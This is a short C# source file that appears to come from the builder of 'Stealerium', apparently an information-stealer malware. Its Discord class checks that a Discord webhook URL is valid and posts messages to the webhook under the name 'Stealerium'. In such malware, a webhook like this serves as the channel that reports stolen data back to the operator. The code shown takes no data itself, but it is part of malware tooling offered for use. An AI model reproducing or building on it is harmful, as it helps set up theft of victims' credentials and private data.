using System.Collections.Specialized;
using System.Net;
using Spectre.Console;

namespace Builder.Modules;

internal sealed class Discord
{
    /// <summary>
    ///     Check if Webhook is valid
    /// </summary>
    /// <returns></returns>
    public static async Task<bool> WebhookIsValidAsync(string? token)
    {
        try
        {
            var client = new HttpClient();
            var response = await client.GetStringAsync(token);
            return response.StartsWith("{\"type\": 1");
        }
        catch
        {
            AnsiConsole.WriteLine("Discord >> Invalid Webhook:\n");
        }

        return false;
    }

    public static async Task<bool> SendMessageAsync(string text, string? token)
    {
        try
        {
            var discordValues = new Dictionary<string, string>();

            var client = new HttpClient();
            
            discordValues.Add("username", "Stealerium");
            discordValues.Add("avatar_url",
                "https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png");
            discordValues.Add("content", text);
            
            var content = new FormUrlEncodedContent(discordValues);
            await client.PostAsync(token, content);
        }
        catch (Exception ex)
        {
            AnsiConsole.Foreground = ConsoleColor.DarkRed;
            Console.WriteLine(ex);
        }

        return false;
    }
}